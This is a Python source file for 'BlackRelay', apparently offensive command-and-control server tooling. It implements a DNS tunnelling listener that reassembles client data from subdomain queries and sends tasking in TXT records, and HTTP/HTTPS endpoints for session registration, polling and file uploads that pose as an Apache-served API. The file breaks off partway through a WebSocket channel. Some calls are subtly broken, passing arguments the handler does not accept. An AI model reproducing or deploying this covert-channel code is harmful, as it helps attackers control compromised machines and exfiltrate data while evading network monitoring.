"""
BlackRelay Stealth Proxy Module
Implements reverse proxy functionality with various obfuscation techniques
"""
import logging
import threading
import socket
import ssl
import time
import base64
import random
import struct
import queue
import re
import os
import sys
import json
import uuid
from typing import Dict, List, Any, Optional, Union, Tuple, Callable

# DNS imports
try:
    import dns.resolver
    import dns.message
    import dns.name
    import dns.rdatatype
    import dns.rdataclass
    import dns.query
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

# HTTP imports
try:
    from http.server import BaseHTTPRequestHandler, HTTPServer
    import urllib.parse
    HAS_HTTP = True
except ImportError:
    HAS_HTTP = False

# Import from other modules
try:
    from blackrelay.encryptor import SymmetricEncryption, AsymmetricEncryption
    from blackcypher.obfuscation import TrafficObfuscator
except ImportError:
    # Fallback to local imports for testing
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    try:
        from encryptor import SymmetricEncryption, AsymmetricEncryption
        # Mock implementation for testing
        class TrafficObfuscator:
            @staticmethod
            def mimic_legitimate_protocol(data, protocol="http"):
                return {"method": "GET", "url": "/api/data", 
                        "headers": {"User-Agent": "Mozilla/5.0"}, 
                        "body": base64.b64encode(data).decode('utf-8')}
            
            @staticmethod
            def extract_data_from_mimicked_protocol(disguised_data, protocol="http"):
                return base64.b64decode(disguised_data.get("body", ""))
    except ImportError:
        # Mock implementations for standalone testing
        class SymmetricEncryption:
            @staticmethod
            def encrypt(data, key): 
                return {"iv": b"", "ciphertext": base64.b64encode(data if isinstance(data, bytes) else data.encode()), "tag": b""}
            
            @staticmethod
            def decrypt(encrypted_data, key):
                return base64.b64decode(encrypted_data["ciphertext"])
        
        class AsymmetricEncryption:
            @staticmethod
            def encrypt(data, public_key): return base64.b64encode(data if isinstance(data, bytes) else data.encode())
            
            @staticmethod
            def decrypt(data, private_key): return base64.b64decode(data)
        
        class TrafficObfuscator:
            @staticmethod
            def mimic_legitimate_protocol(data, protocol="http"):
                return {"method": "GET", "url": "/api/data", 
                        "headers": {"User-Agent": "Mozilla/5.0"}, 
                        "body": base64.b64encode(data if isinstance(data, bytes) else data.encode()).decode('utf-8')}
            
            @staticmethod
            def extract_data_from_mimicked_protocol(disguised_data, protocol="http"):
                return base64.b64decode(disguised_data.get("body", ""))


class StealthProxy:
    """Base class for stealth proxy implementations"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the stealth proxy
        
        Args:
            config: Proxy configuration
        """
        self.config = config
        self.logger = self._setup_logging()
        self.running = False
        self.channels = {}
        self.active_sessions = {}
        self.encryption_keys = {}
        self.traffic_transformer = TrafficObfuscator()
        self.data_queue = queue.Queue()
        self.response_queue = queue.Queue()
        
        # Load or generate encryption keys
        self._setup_encryption()
        
        self.logger.info(f"StealthProxy initialized")
    
    def _setup_logging(self) -> logging.Logger:
        """Set up logging for the proxy
        
        Returns:
            Configured logger
        """
        logger = logging.getLogger("BlackRelay.StealthProxy")
        logger.setLevel(logging.INFO)
        
        # Create handlers
        c_handler = logging.StreamHandler()
        f_handler = logging.FileHandler("stealth_proxy.log")
        c_handler.setLevel(logging.INFO)
        f_handler.setLevel(logging.DEBUG)
        
        # Create formatters
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        c_handler.setFormatter(formatter)
        f_handler.setFormatter(formatter)
        
        # Add handlers to logger
        logger.addHandler(c_handler)
        logger.addHandler(f_handler)
        
        return logger
    
    def _setup_encryption(self):
        """Set up encryption keys"""
        # This is a placeholder - subclasses should implement their own encryption setup
        pass
    
    def start(self):
        """Start the proxy"""
        if self.running:
            return
        
        self.running = True
        self._start_proxy()
        
        self.logger.info(f"StealthProxy started")
    
    def stop(self):
        """Stop the proxy"""
        if not self.running:
            return
        
        self.running = False
        self._stop_proxy()
        
        self.logger.info(f"StealthProxy stopped")
    
    def _start_proxy(self):
        """Start proxy-specific operations (to be implemented by subclasses)"""
        raise NotImplementedError("Subclasses must implement _start_proxy")
    
    def _stop_proxy(self):
        """Stop proxy-specific operations (to be implemented by subclasses)"""
        raise NotImplementedError("Subclasses must implement _stop_proxy")
    
    def register_data_handler(self, callback: Callable):
        """Register a callback for handling data
        
        Args:
            callback: Function to call when data is received
        """
        self.data_handler = callback
    
    def register_response_handler(self, callback: Callable):
        """Register a callback for handling responses
        
        Args:
            callback: Function to call when a response is received
        """
        self.response_handler = callback
    
    def send_data(self, data: Union[str, bytes], target: Optional[str] = None,
                session_id: Optional[str] = None) -> bool:
        """Send data through the proxy
        
        Args:
            data: Data to send
            target: Optional target identifier
            session_id: Optional session ID
            
        Returns:
            True if successful, False otherwise
        """
        # This is a placeholder - subclasses should implement their own send_data
        return False
    
    def _process_received_data(self, data: Union[str, bytes], 
                             source: Optional[str] = None, 
                             session_id: Optional[str] = None):
        """Process data received by the proxy
        
        Args:
            data: Received data
            source: Source identifier (e.g., IP address)
            session_id: Session identifier
        """
        if hasattr(self, 'data_handler'):
            try:
                self.data_handler(data, source, session_id)
            except Exception as e:
                self.logger.error(f"Error in data handler: {e}")
        else:
            self.logger.warning("Received data but no handler registered")
            # Queue data for later processing
            self.data_queue.put((data, source, session_id))
    
    def _send_response(self, response_data: Union[str, bytes],
                     target: Optional[str] = None,
                     session_id: Optional[str] = None) -> bool:
        """Send a response through the proxy
        
        Args:
            response_data: Response data to send
            target: Optional target identifier
            session_id: Optional session ID
            
        Returns:
            True if successful, False otherwise
        """
        # This is a placeholder - subclasses should implement their own send_response
        return False


class DnsProxy(StealthProxy):
    """DNS tunneling proxy implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the DNS proxy
        
        Args:
            config: Proxy configuration
        """
        super().__init__(config)
        
        if not HAS_DNS:
            self.logger.error("dnspython module not available, DNS proxy will be disabled")
            return
        
        # Extract DNS-specific configuration
        self.domain = config.get("domain", "c2.local")
        self.listen_addr = config.get("listen_address", "0.0.0.0")
        self.listen_port = config.get("listen_port", 53)
        self.upstream_dns = config.get("upstream_dns", "8.8.8.8")
        self.ttl = config.get("ttl", 60)
        self.chunking = config.get("chunking", True)
        self.chunk_size = config.get("chunk_size", 30)
        self.encoding = config.get("encoding", "base32")
        
        # Message fragments tracking
        self.message_fragments = {}
        self.response_fragments = {}
        
        # Select encoding and decoding functions
        if self.encoding == "base32":
            self.encoder = base64.b32encode
            self.decoder = base64.b32decode
        elif self.encoding == "base64":
            self.encoder = base64.b64encode
            self.decoder = base64.b64decode
        else:
            self.logger.warning(f"Unknown encoding {self.encoding}, fallback to base32")
            self.encoder = base64.b32encode
            self.decoder = base64.b32decode
    
    def _setup_encryption(self):
        """Set up encryption keys for DNS proxy"""
        # Generate a random AES key for this session
        self.session_key = os.urandom(32)  # 256-bit key
    
    def _start_proxy(self):
        """Start DNS proxy server"""
        if not HAS_DNS:
            self.logger.error("DNS proxy cannot be started (missing dnspython module)")
            return
        
        try:
            # Create UDP socket for DNS server
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.listen_addr, self.listen_port))
            
            # Start listener thread
            self.dns_thread = threading.Thread(target=self._dns_server_loop)
            self.dns_thread.daemon = True
            self.dns_thread.start()
            
            self.logger.info(f"DNS proxy started on {self.listen_addr}:{self.listen_port}")
        except Exception as e:
            self.logger.error(f"Failed to start DNS proxy: {e}")
    
    def _stop_proxy(self):
        """Stop DNS proxy server"""
        if hasattr(self, 'sock'):
            try:
                self.sock.close()
            except:
                pass
    
    def _dns_server_loop(self):
        """Main loop for DNS server"""
        self.sock.settimeout(1.0)
        
        while self.running:
            try:
                data, addr = self.sock.recvfrom(4096)
                
                # Process DNS query in a separate thread to avoid blocking
                threading.Thread(
                    target=self._process_dns_query,
                    args=(data, addr)
                ).start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:  # Only log if still running
                    self.logger.error(f"Error in DNS server loop: {e}")
    
    def _process_dns_query(self, data: bytes, addr: Tuple[str, int]):
        """Process a DNS query
        
        Args:
            data: DNS query data
            addr: Client address
        """
        try:
            # Parse DNS query
            query = dns.message.from_wire(data)
            
            # Process each question
            for question in query.question:
                qname = question.name.to_text().strip('.')
                
                # Check if this is a C2 query directed to our domain
                if qname.endswith(self.domain):
                    # This is a C2 query
                    response = self._handle_c2_query(query, qname)
                else:
                    # Pass through to upstream DNS
                    response = self._forward_to_upstream(query)
                
                # Send response
                self.sock.sendto(response.to_wire(), addr)
                
        except Exception as e:
            self.logger.error(f"Error processing DNS query: {e}")
            
            # Try to send a DNS error response
            try:
                error_response = dns.message.make_response(data)
                error_response.set_rcode(dns.rcode.SERVFAIL)
                self.sock.sendto(error_response.to_wire(), addr)
            except:
                pass
    
    def _handle_c2_query(self, query: Any, qname: str) -> Any:
        """Handle a C2 DNS query
        
        Args:
            query: DNS query object
            qname: Query name
            
        Returns:
            DNS response object
        """
        # Create response
        response = dns.message.make_response(query)
        
        # Extract subdomain prefix (remove our domain)
        subdomain = qname[:-len(self.domain)-1]  # Remove domain and the dot
        
        # Check if this is a data message
        if subdomain.startswith('d-'):
            # Data message format: d-<session_id>-<chunk_num>-<total_chunks>-<data>
            parts = subdomain.split('-', 4)
            
            if len(parts) < 5:
                # Invalid format
                self.logger.warning(f"Invalid data message format: {subdomain}")
                response.set_rcode(dns.rcode.FORMERR)
                return response
                
            session_id = parts[1]
            chunk_num = int(parts[2])
            total_chunks = int(parts[3])
            encoded_data = parts[4]
            
            # Store fragment
            if session_id not in self.message_fragments:
                self.message_fragments[session_id] = {}
            
            try:
                # Decode data
                data_chunk = self.decoder(encoded_data.upper().encode('ascii'))
                self.message_fragments[session_id][chunk_num] = data_chunk
                
                # Check if we have all chunks
                if len(self.message_fragments[session_id]) == total_chunks:
                    # Reassemble message
                    ordered_chunks = [self.message_fragments[session_id][i] 
                                     for i in range(1, total_chunks + 1)]
                    complete_data = b''.join(ordered_chunks)
                    
                    # Process the complete message
                    self._process_received_data(complete_data, addr=None, session_id=session_id)
                    
                    # Clear fragments
                    del self.message_fragments[session_id]
                
                # Create a response - if we have a pending response for this session, send a chunk
                if session_id in self.response_fragments and self.response_fragments[session_id]:
                    response_chunk = self.response_fragments[session_id].pop(0)
                    txt_rdata = dns.rdatatype.from_text('TXT')
                    answer_name = dns.name.from_text(qname)
                    answer_ttl = self.ttl
                    
                    # Add TXT record with response data
                    answer_rdata = dns.rdata.from_text(
                        dns.rdataclass.IN, 
                        txt_rdata, 
                        response_chunk
                    )
                    answer = dns.rrset.RRset(answer_name, dns.rdataclass.IN, txt_rdata)
                    answer.add(answer_rdata, ttl=answer_ttl)
                    response.answer.append(answer)
                    
                    # If no more fragments, clean up
                    if not self.response_fragments[session_id]:
                        del self.response_fragments[session_id]
                else:
                    # No response yet, just send an empty TXT record as acknowledgment
                    txt_rdata = dns.rdatatype.from_text('TXT')
                    answer_name = dns.name.from_text(qname)
                    answer_ttl = self.ttl
                    answer_rdata = dns.rdata.from_text(
                        dns.rdataclass.IN, 
                        txt_rdata, 
                        "ack"
                    )
                    answer = dns.rrset.RRset(answer_name, dns.rdataclass.IN, txt_rdata)
                    answer.add(answer_rdata, ttl=answer_ttl)
                    response.answer.append(answer)
                
            except Exception as e:
                self.logger.error(f"Error processing data chunk: {e}")
                response.set_rcode(dns.rcode.SERVFAIL)
                
        elif subdomain.startswith('c-'):
            # Control message format: c-<command>-<param>
            parts = subdomain.split('-', 2)
            
            if len(parts) < 3:
                # Invalid format
                self.logger.warning(f"Invalid control message format: {subdomain}")
                response.set_rcode(dns.rcode.FORMERR)
                return response
                
            command = parts[1]
            param = parts[2]
            
            if command == 'register':
                # Registration request
                session_id = str(uuid.uuid4())
                
                # Add TXT record with session ID
                txt_rdata = dns.rdatatype.from_text('TXT')
                answer_name = dns.name.from_text(qname)
                answer_ttl = self.ttl
                answer_rdata = dns.rdata.from_text(
                    dns.rdataclass.IN, 
                    txt_rdata, 
                    f"session:{session_id}"
                )
                answer = dns.rrset.RRset(answer_name, dns.rdataclass.IN, txt_rdata)
                answer.add(answer_rdata, ttl=answer_ttl)
                response.answer.append(answer)
                
                self.logger.info(f"Registered new DNS session: {session_id}")
                
            elif command == 'poll':
                # Polling request - Check if we have any data to send to the client
                session_id = param
                
                if session_id in self.response_fragments and self.response_fragments[session_id]:
                    response_chunk = self.response_fragments[session_id].pop(0)
                    txt_rdata = dns.rdatatype.from_text('TXT')
                    answer_name = dns.name.from_text(qname)
                    answer_ttl = self.ttl
                    
                    # Add TXT record with response data
                    answer_rdata = dns.rdata.from_text(
                        dns.rdataclass.IN, 
                        txt_rdata, 
                        response_chunk
                    )
                    answer = dns.rrset.RRset(answer_name, dns.rdataclass.IN, txt_rdata)
                    answer.add(answer_rdata, ttl=answer_ttl)
                    response.answer.append(answer)
                    
                    # If no more fragments, clean up
                    if not self.response_fragments[session_id]:
                        del self.response_fragments[session_id]
                else:
                    # No data to send
                    txt_rdata = dns.rdatatype.from_text('TXT')
                    answer_name = dns.name.from_text(qname)
                    answer_ttl = self.ttl
                    answer_rdata = dns.rdata.from_text(
                        dns.rdataclass.IN, 
                        txt_rdata, 
                        "no-data"
                    )
                    answer = dns.rrset.RRset(answer_name, dns.rdataclass.IN, txt_rdata)
                    answer.add(answer_rdata, ttl=answer_ttl)
                    response.answer.append(answer)
            
            else:
                # Unknown command
                self.logger.warning(f"Unknown command: {command}")
                response.set_rcode(dns.rcode.NOTIMP)
                
        else:
            # Not a valid C2 query
            self.logger.warning(f"Invalid C2 query format: {subdomain}")
            response.set_rcode(dns.rcode.FORMERR)
        
        return response
    
    def _forward_to_upstream(self, query: Any) -> Any:
        """Forward a DNS query to upstream DNS server
        
        Args:
            query: DNS query object
            
        Returns:
            DNS response object
        """
        try:
            # Send query to upstream DNS
            response = dns.query.udp(query, self.upstream_dns)
            return response
        except Exception as e:
            self.logger.error(f"Error forwarding to upstream DNS: {e}")
            
            # Create error response
            response = dns.message.make_response(query)
            response.set_rcode(dns.rcode.SERVFAIL)
            return response
    
    def send_data(self, data: Union[str, bytes], target: Optional[str] = None,
                session_id: Optional[str] = None) -> bool:
        """Send data through the DNS tunnel
        
        Args:
            data: Data to send
            target: Target identifier (ignored for DNS)
            session_id: Session ID
            
        Returns:
            True if successful, False otherwise
        """
        if not session_id:
            self.logger.error("Cannot send data without session ID")
            return False
            
        try:
            # Convert data to bytes if it's a string
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            # Encrypt data
            encrypted_data = SymmetricEncryption.encrypt(data, self.session_key)
            
            # Combine encrypted data
            combined_data = encrypted_data.get('iv', b'') + encrypted_data.get('ciphertext', b'') + encrypted_data.get('tag', b'')
            
            # Split into chunks if needed
            chunks = []
            if self.chunking:
                for i in range(0, len(combined_data), self.chunk_size):
                    chunk = combined_data[i:i+self.chunk_size]
                    chunks.append(chunk)
            else:
                chunks = [combined_data]
                
            total_chunks = len(chunks)
            
            # Store response fragments for retrieval via DNS
            self.response_fragments[session_id] = []
            
            for i, chunk in enumerate(chunks, 1):
                # Encode chunk
                encoded_chunk = self.encoder(chunk).decode('ascii').rstrip('=')
                
                # Format as DNS response
                fragment = f"data-{i}-{total_chunks}-{encoded_chunk}"
                self.response_fragments[session_id].append(fragment)
            
            self.logger.debug(f"Prepared {total_chunks} response fragments for session {session_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending data via DNS tunnel: {e}")
            return False


class HttpProxy(StealthProxy):
    """HTTP/HTTPS proxy implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the HTTP proxy
        
        Args:
            config: Proxy configuration
        """
        super().__init__(config)
        
        if not HAS_HTTP:
            self.logger.error("HTTP server module not available, HTTP proxy will be disabled")
            return
        
        # Extract HTTP-specific configuration
        self.listen_addr = config.get("listen_address", "0.0.0.0")
        self.http_port = config.get("http_port", 8080)
        self.https_port = config.get("https_port", 8443)
        self.use_ssl = config.get("use_ssl", True)
        self.cert_file = config.get("cert_file", "server.crt")
        self.key_file = config.get("key_file", "server.key")
        self.enable_http = config.get("enable_http", True)
        self.enable_https = config.get("enable_https", True)
        self.mime_types = config.get("mime_types", ["text/plain", "application/json", "application/octet-stream"])
        
        # URL paths for different operations
        self.data_path = config.get("data_path", "/api/data")
        self.control_path = config.get("control_path", "/api/control")
        self.file_path = config.get("file_path", "/api/file")
        self.status_path = config.get("status_path", "/api/status")
        
        # Server instances
        self.http_server = None
        self.https_server = None
        
        # Session management
        self.active_sessions = {}
    
    def _setup_encryption(self):
        """Set up encryption keys for HTTP proxy"""
        # This would normally load SSL certificates or generate them
        pass
    
    def _start_proxy(self):
        """Start HTTP proxy server"""
        if not HAS_HTTP:
            self.logger.error("HTTP proxy cannot be started (missing HTTP server module)")
            return
            
        try:
            # Create HTTP request handler
            handler = self._create_request_handler()
            
            # Start HTTP server if enabled
            if self.enable_http:
                self.http_server = HTTPServer((self.listen_addr, self.http_port), handler)
                http_thread = threading.Thread(target=self.http_server.serve_forever)
                http_thread.daemon = True
                http_thread.start()
                self.logger.info(f"HTTP proxy started on {self.listen_addr}:{self.http_port}")
                
            # Start HTTPS server if enabled
            if self.enable_https and self.use_ssl:
                self.https_server = HTTPServer((self.listen_addr, self.https_port), handler)
                
                # Wrap with SSL
                try:
                    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                    ssl_context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                    self.https_server.socket = ssl_context.wrap_socket(self.https_server.socket, server_side=True)
                    
                    https_thread = threading.Thread(target=self.https_server.serve_forever)
                    https_thread.daemon = True
                    https_thread.start()
                    self.logger.info(f"HTTPS proxy started on {self.listen_addr}:{self.https_port}")
                except Exception as e:
                    self.logger.error(f"Failed to start HTTPS server: {e}")
            
        except Exception as e:
            self.logger.error(f"Failed to start HTTP proxy: {e}")
    
    def _stop_proxy(self):
        """Stop HTTP proxy server"""
        if self.http_server:
            self.http_server.shutdown()
            self.http_server = None
            
        if self.https_server:
            self.https_server.shutdown()
            self.https_server = None
    
    def _create_request_handler(self):
        """Create HTTP request handler class with a reference to this proxy
        
        Returns:
            HTTP request handler class
        """
        proxy = self
        
        class ProxyRequestHandler(BaseHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                self.proxy = proxy
                super().__init__(*args, **kwargs)
            
            def log_message(self, format, *args):
                # Redirect logging to the proxy logger
                if self.proxy.logger:
                    self.proxy.logger.debug(format % args)
            
            def do_GET(self):
                """Handle GET requests"""
                try:
                    url = urllib.parse.urlparse(self.path)
                    path = url.path
                    
                    # Check if this is a status request
                    if path == self.proxy.status_path:
                        self._handle_status_request()
                    # Check if this is a control request
                    elif path == self.proxy.control_path:
                        self._handle_control_request('GET')
                    # Check if this is a polling request
                    elif path.startswith(self.proxy.data_path):
                        self._handle_data_request('GET')
                    # Serve static content or 404
                    else:
                        self._serve_static_content()
                except Exception as e:
                    self.proxy.logger.error(f"Error handling GET request: {e}")
                    self._send_error(500, str(e))
            
            def do_POST(self):
                """Handle POST requests"""
                try:
                    url = urllib.parse.urlparse(self.path)
                    path = url.path
                    
                    # Check if this is a data submission
                    if path == self.proxy.data_path:
                        self._handle_data_request('POST')
                    # Check if this is a control request
                    elif path == self.proxy.control_path:
                        self._handle_control_request('POST')
                    # Check if this is a file upload
                    elif path == self.proxy.file_path:
                        self._handle_file_request()
                    else:
                        self._send_error(404, "Not Found")
                except Exception as e:
                    self.proxy.logger.error(f"Error handling POST request: {e}")
                    self._send_error(500, str(e))
            
            def _handle_status_request(self):
                """Handle status request"""
                # Return a simple status response
                status = {
                    "status": "ok",
                    "version": "1.0.0",
                    "timestamp": int(time.time())
                }
                
                self._send_json_response(200, status)
            
            def _handle_control_request(self, method):
                """Handle control request
                
                Args:
                    method: HTTP method (GET or POST)
                """
                if method == 'GET':
                    # Parse query parameters
                    url = urllib.parse.urlparse(self.path)
                    params = urllib.parse.parse_qs(url.query)
                    
                    command = params.get('cmd', ['status'])[0]
                    session_id = params.get('sid', [None])[0]
                    
                    if command == 'register':
                        # Registration request
                        session_id = str(uuid.uuid4())
                        self.proxy.active_sessions[session_id] = {
                            "id": session_id,
                            "created": time.time(),
                            "last_active": time.time(),
                            "ip": self.client_address[0],
                            "port": self.client_address[1],
                            "pending_data": []
                        }
                        
                        self._send_json_response(200, {"status": "ok", "session_id": session_id})
                        self.proxy.logger.info(f"Registered new HTTP session: {session_id}")
                    
                    elif command == 'poll':
                        # Polling request - Check if we have any data to send
                        if not session_id:
                            self._send_error(400, "Missing session ID")
                            return
                            
                        if session_id not in self.proxy.active_sessions:
                            self._send_error(403, "Invalid session ID")
                            return
                            
                        session = self.proxy.active_sessions[session_id]
                        session["last_active"] = time.time()
                        
                        if session["pending_data"]:
                            # Send next pending message
                            data = session["pending_data"].pop(0)
                            self._send_binary_response(200, data, content_type="application/octet-stream")
                        else:
                            # No pending data
                            self._send_json_response(204, {"status": "no-data"})
                    
                    else:
                        # Unknown command
                        self._send_error(400, f"Unknown command: {command}")
                
                elif method == 'POST':
                    # Read request body
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length)
                    
                    try:
                        # Parse JSON body
                        control_data = json.loads(body.decode('utf-8'))
                        
                        command = control_data.get('cmd')
                        session_id = control_data.get('sid')
                        
                        if command == 'register':
                            # Registration with additional data
                            client_info = control_data.get('info', {})
                            session_id = str(uuid.uuid4())
                            
                            self.proxy.active_sessions[session_id] = {
                                "id": session_id,
                                "created": time.time(),
                                "last_active": time.time(),
                                "ip": self.client_address[0],
                                "port": self.client_address[1],
                                "info": client_info,
                                "pending_data": []
                            }
                            
                            self._send_json_response(200, {"status": "ok", "session_id": session_id})
                            self.proxy.logger.info(f"Registered new HTTP session with info: {session_id}")
                        
                        else:
                            # Unknown command
                            self._send_error(400, f"Unknown command: {command}")
                            
                    except json.JSONDecodeError:
                        self._send_error(400, "Invalid JSON")
            
            def _handle_data_request(self, method):
                """Handle data request
                
                Args:
                    method: HTTP method (GET or POST)
                """
                if method == 'GET':
                    # Parse query parameters
                    url = urllib.parse.urlparse(self.path)
                    params = urllib.parse.parse_qs(url.query)
                    
                    session_id = params.get('sid', [None])[0]
                    
                    if not session_id:
                        self._send_error(400, "Missing session ID")
                        return
                        
                    if session_id not in self.proxy.active_sessions:
                        self._send_error(403, "Invalid session ID")
                        return
                        
                    session = self.proxy.active_sessions[session_id]
                    session["last_active"] = time.time()
                    
                    if session["pending_data"]:
                        # Send next pending message
                        data = session["pending_data"].pop(0)
                        self._send_binary_response(200, data, content_type="application/octet-stream")
                    else:
                        # No pending data
                        self._send_json_response(204, {"status": "no-data"})
                
                elif method == 'POST':
                    # Read request body
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length)
                    
                    # Check for session ID
                    url = urllib.parse.urlparse(self.path)
                    params = urllib.parse.parse_qs(url.query)
                    session_id = params.get('sid', [None])[0]
                    
                    if not session_id:
                        # Try to get from headers
                        session_id = self.headers.get('X-Session-ID')
                        
                    if not session_id:
                        self._send_error(400, "Missing session ID")
                        return
                        
                    if session_id not in self.proxy.active_sessions:
                        self._send_error(403, "Invalid session ID")
                        return
                    
                    # Process received data
                    session = self.proxy.active_sessions[session_id]
                    session["last_active"] = time.time()
                    
                    # Process the data through the proxy
                    self.proxy._process_received_data(body, source=self.client_address[0], session_id=session_id)
                    
                    # Send acknowledgment
                    self._send_json_response(200, {"status": "ok", "received": len(body)})
            
            def _handle_file_request(self):
                """Handle file upload/download request"""
                # Read request body
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length)
                
                # Check for session ID
                url = urllib.parse.urlparse(self.path)
                params = urllib.parse.parse_qs(url.query)
                session_id = params.get('sid', [None])[0]
                
                if not session_id:
                    # Try to get from headers
                    session_id = self.headers.get('X-Session-ID')
                    
                if not session_id:
                    self._send_error(400, "Missing session ID")
                    return
                    
                if session_id not in self.proxy.active_sessions:
                    self._send_error(403, "Invalid session ID")
                    return
                
                # Process file data
                session = self.proxy.active_sessions[session_id]
                session["last_active"] = time.time()
                
                # Process through proxy with file flag
                file_info = {
                    "filename": self.headers.get('X-Filename', 'unknown'),
                    "content_type": self.headers.get('Content-Type', 'application/octet-stream'),
                    "size": len(body)
                }
                
                # Process the file through the proxy
                self.proxy._process_received_data(body, source=self.client_address[0], 
                                               session_id=session_id, file_info=file_info)
                
                # Send acknowledgment
                self._send_json_response(200, {
                    "status": "ok", 
                    "received": len(body),
                    "filename": file_info["filename"]
                })
            
            def _serve_static_content(self):
                """Serve static content or 404"""
                # This would serve static files for masquerading as a normal web server
                self._send_error(404, "Not Found")
            
            def _send_json_response(self, code, data):
                """Send a JSON response
                
                Args:
                    code: HTTP status code
                    data: Response data (will be converted to JSON)
                """
                self.send_response(code)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Server', 'Apache')  # Masquerade as Apache
                self.end_headers()
                
                json_data = json.dumps(data).encode('utf-8')
                self.wfile.write(json_data)
            
            def _send_binary_response(self, code, data, content_type="application/octet-stream"):
                """Send a binary response
                
                Args:
                    code: HTTP status code
                    data: Binary data to send
                    content_type: MIME type
                """
                self.send_response(code)
                self.send_header('Content-Type', content_type)
                self.send_header('Content-Length', str(len(data)))
                self.send_header('Server', 'Apache')  # Masquerade as Apache
                self.end_headers()
                
                self.wfile.write(data)
            
            def _send_error(self, code, message):
                """Send an error response
                
                Args:
                    code: HTTP status code
                    message: Error message
                """
                self.send_response(code)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Server', 'Apache')  # Masquerade as Apache
                self.end_headers()
                
                error_data = {"error": True, "message": message}
                json_data = json.dumps(error_data).encode('utf-8')
                self.wfile.write(json_data)
        
        return ProxyRequestHandler
    
    def send_data(self, data: Union[str, bytes], target: Optional[str] = None,
                session_id: Optional[str] = None) -> bool:
        """Send data through the HTTP tunnel
        
        Args:
            data: Data to send
            target: Target identifier (ignored for HTTP)
            session_id: Session ID
            
        Returns:
            True if successful, False otherwise
        """
        if not session_id:
            self.logger.error("Cannot send data without session ID")
            return False
            
        try:
            # Convert data to bytes if it's a string
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            # Check if session exists
            if session_id not in self.active_sessions:
                self.logger.error(f"Unknown session ID: {session_id}")
                return False
                
            # Queue data for retrieval via HTTP
            session = self.active_sessions[session_id]
            session["pending_data"].append(data)
            
            self.logger.debug(f"Queued {len(data)} bytes for session {session_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending data via HTTP tunnel: {e}")
            return False


class WebSocketProxy(StealthProxy):
    """WebSocket proxy implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the WebSocket proxy
        
        Args:
            config: Proxy configuration
        """
        super().__init__(config)
        
        # Attempt to import WebSocket libraries
        try:
            import websockets
            self.websockets = websockets
            self.HAS_WEBSOCKET = True
        except ImportError:
            self.logger.error("websockets module not available, WebSocket proxy will be disabled")
            self.HAS_WEBSOCKET = False
            return
        
        # Extract WebSocket-specific configuration
        self.listen_addr = config.get("listen_address", "0.0.0.0")
        self.ws_port = config.get("ws_port", 8765)
        self.wss_port = config.get("wss_port", 8766)
        self.use_ssl = config.get("use_ssl", True)
        self.cert_file = config.get("cert_file", "server.crt")
        self.key_file = config.get("key_file", "server.key")
        self.enable_ws = config.get("enable_ws", True)
        self.enable_wss = config.get("enable_wss", True)
        self.path = config.get("path", "/ws")
        
        # Server instances
        self.ws_server = None
        self.wss_server = None
        
        # Connection tracking
        self.connections = {}
        self.connection_handlers = {}
    
    def _setup_encryption(self):
        """Set up encryption keys for WebSocket proxy"""
        # This would normally load SSL certificates
        pass
    
    def _start_proxy(self):
        """Start WebSocket proxy server"""
        if not self.HAS_WEBSOCKET:
            self.logger.error("WebSocket proxy cannot be started (missing websockets module)")
            return
            
        try:
            websockets = self.websockets
            
            # Define handler
            async def ws_handler(websocket, path):
                # Generate a connection ID
                conn_id = str(uuid.uuid4())
                
                # Store connection
                self.connections[conn_id] = {
                    "websocket": websocket,
                    "path": path,
                    "connected": time.time(),
                    "last_activity": time.time()
                }
                
                try:
                    # Handle initial registration
                    session_id = None
                    
                    # Receive registration message
                    reg_message = await websocket.recv()
                    try:
                        reg_data = json.loads(reg_message)
                        if reg_data.get("type") == "register":
                            # New registration
                            session_id = str(uuid.uuid4())
                            reg_response = {
                                "type": "register_ack",
                                "session_id": session_id,
                                "status": "ok"
                            }
                            await websocket.send(json.dumps(reg_response))
                            
                            self.logger.info(f"Registered new WebSocket session: {session_id}")
                        elif reg_data.get("type") == "auth" and reg_data.get("session_id"):
                            # Using existing session
                            session_id = reg_data.get("session_id")
                            
                            # Validate session (this would normally check against stored sessions)
                            auth_response = {
                                "type": "auth_ack",
                                "session_id": session_id,
                                "status": "ok"
                            }
                            await websocket.send(json.dumps(auth_response))
                            
                            self.logger.info(f"Authenticated existing WebSocket session: {session_id}")
                        else:
                            # Invalid registration
                            await websocket.send(json.dumps({
                                "type": "error",
                                "message": "Invalid registration"
                            }))
                            return
                    except json.JSONDecodeError:
                        # Invalid JSON
                        await websocket.send(json.dumps({
                            "type": "error",
                            "message": "Invalid JSON"
                        }))
                        return
                    
                    # Update connection with session ID
                    self.connections[conn_id]["session_id"] = session_id
                    
                    # Create handler for this connection
                    handler = threading.Thread(target=self._create_ws_handler(conn_id, session_id))
                    handler.daemon = True
                    handler.start()
                    self.connection_handlers[conn_id] = handler
                    
                    # Start message loop
                    while True:
                        message = await websocket.recv()
                        self.connections[conn_id]["last_activity"] = time.time()
                        
                        # Process message
                        self._process_received_data(message, source=str(websocket.remote_address), 
                                                 session_id=session_id)
                        
                except websockets.exceptions.ConnectionClosed:
                    self.logger.debug(f"WebSocket connection closed: {conn_id}")
                except Exception as e:
